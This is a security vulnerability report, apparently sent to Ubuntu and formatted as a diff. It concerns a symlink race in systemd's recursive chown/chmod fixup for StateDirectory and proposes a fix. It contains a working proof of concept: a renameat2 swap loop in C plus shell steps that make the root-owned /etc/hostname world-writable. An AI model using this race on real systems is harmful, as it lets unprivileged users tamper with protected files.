@@ -1,0 +1,151 @@
+[I am sending this bug report to Ubuntu, even though it's an upstream
+bug, as requested at
+https://github.com/systemd/systemd/blob/master/docs/CONTRIBUTING.md#security-vulnerability-reports
+.]
+
+When chown_one() in the recursive chown logic decides that it has to change
+ownership of a directory entry, it first changes ownership as follows:
+
+        if (name)
+                r = fchownat(fd, name, uid, gid, AT_SYMLINK_NOFOLLOW);
+        else
+                r = fchown(fd, uid, gid);
+        if (r < 0)
+                return -errno;
+
+So far, this looks good. But then this happens:
+
+        /* The linux kernel alters the mode in some cases of chown(). Let's undo this. */
+        if (name) {
+                if (!S_ISLNK(st->st_mode))
+                        r = fchmodat(fd, name, st->st_mode, 0);
+                else /* There's currently no AT_SYMLINK_NOFOLLOW for fchmodat() */
+                        r = 0;
+        } else
+                r = fchmod(fd, st->st_mode);
+
+This is dangerous, especially in the case where `name != NULL`.
+
+First off: I don't think that the overall objective of this code block makes
+sense. Yes, the kernel sometimes changes the mode when ownership is changed -
+but that's only for set-UID binaries and set-GID binaries (but not
+set-GID directories).
+I'm pretty sure that setuid/setgid binaries aren't supposed to appear in these
+directories anyway.
+
+The problem here is that, as the comment explains,
+`fchmodat(fd, name, st->st_mode, 0)` follows symlinks. The fchmodat() call is
+guarded by a `S_ISLNK(st->st_mode)` check, but that's obviously racy and
+therefore doesn't actually help.
+
+My recommended fix is to just remove the offending code block. If, for some
+crazy reason, you actually want to support changing the ownership of
+setuid/setgid binaries, an alternative might be to do something like this:
+
+    int fd2 = openat(fd, name, O_PATH|O_NOFOLLOW|O_CLOEXEC);
+    if (fd2 >= 0) {
+      fchmod(fd2, st->st_mode);
+      close(fd2);
+    }
+
+To reproduce, as root, create a service with "Restart=always",
+"StartLimitIntervalSec=0", "StateDirectory=test_service" and "User=user" (where
+"user" is the name of an unprivileged account). Point "ExecStart" at a binary
+that immediately exits:
+
+========
+int main(void) {
+  return 0;
+}
+========
+
+Then start the service.
+
+Next, as the user the service is running as, create some entries in
+/var/lib/test_service:
+
+========
+user@ubuntu-18-04-vm:~$ cd /var/lib/test_service/
+user@ubuntu-18-04-vm:/var/lib/test_service$ touch foo
+user@ubuntu-18-04-vm:/var/lib/test_service$ chmod 0666 foo
+user@ubuntu-18-04-vm:/var/lib/test_service$ ln -s /etc/hostname foo2
+user@ubuntu-18-04-vm:/var/lib/test_service$ ln foo foo_link
+user@ubuntu-18-04-vm:/var/lib/test_service$ ls -la
+total 8
+drwxr-xr-x  2 user user 4096 Okt  8 16:42 .
+drwxr-xr-x 67 root root 4096 Okt  8 15:30 ..
+-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo
+lrwxrwxrwx  1 user user   13 Okt  8 16:23 foo2 -> /etc/hostname
+-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo_link
+========
+
+Create and run a helper that continuously switches "foo" and "foo2" with each
+other:
+
+========
+user@ubuntu-18-04-vm:~$ cat exchange.c
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <err.h>
+#include <sys/syscall.h>
+int main(int argc, char **argv) {
+        char *base = argv[1], *p1 = argv[2], *p2 = argv[3];
+        if (chdir(base)) err(1, "chdir");
+        while (1) {
+                if (syscall(__NR_renameat2, AT_FDCWD, p1, AT_FDCWD, p2, 2))
+                        perror("renameat");
+        }
+}
+user@ubuntu-18-04-vm:~$ gcc -o exchange exchange.c -O2
+user@ubuntu-18-04-vm:~$ ./exchange /var/lib/test_service foo foo2
+========
+
+Change ownership of "foo_link" and the test_service directory to trigger the
+permission fixup logic when the service restarts the next time:
+
+========
+user@ubuntu-18-04-vm:/var/lib/test_service$ chown user:cdrom foo_link .
+========
+
+Check whether it worked:
+
+========
+user@ubuntu-18-04-vm:/var/lib/test_service$ ls -la /etc/hostname .
+-rw-r--r-- 1 root root   16 Jul  3 19:20 /etc/hostname
+
+.:
+total 8
+drwxr-xr-x  2 user user 4096 Okt  8 16:45 .
+drwxr-xr-x 67 root root 4096 Okt  8 15:30 ..
+lrwxrwxrwx  1 user user   13 Okt  8 16:23 foo -> /etc/hostname
+-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo2
+-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo_link
+========
+
+If it didn't work (as in this example), retry the chown a few times. After a few
+times, you should see this:
+
+========
+user@ubuntu-18-04-vm:/var/lib/test_service$ ls -la /etc/hostname .
+-rw-rw-rw- 1 root root   16 Jul  3 19:20 /etc/hostname
+
+.:
+total 8
+drwxr-xr-x  2 user user 4096 Okt  8 16:46 .
+drwxr-xr-x 67 root root 4096 Okt  8 15:30 ..
+-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo
+lrwxrwxrwx  1 user user   13 Okt  8 16:23 foo2 -> /etc/hostname
+-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo_link
+========
+
+
+
+Another thing that might also go wrong, but that I haven't tested, is the
+interaction with the mount.ecryptfs_private helper that comes with ecryptfs.
+As far as I can tell, an attacker would be able to use mount.ecryptfs_private to
+mount an ecryptfs inside the StateDirectory. This ecryptfs instance could then
+function similar to a bind mount, causing systemd to change the ownership of
+files that are e.g. in /etc. You might want to ensure that no files or
+directories you access are located on an ecryptfs filesystem.
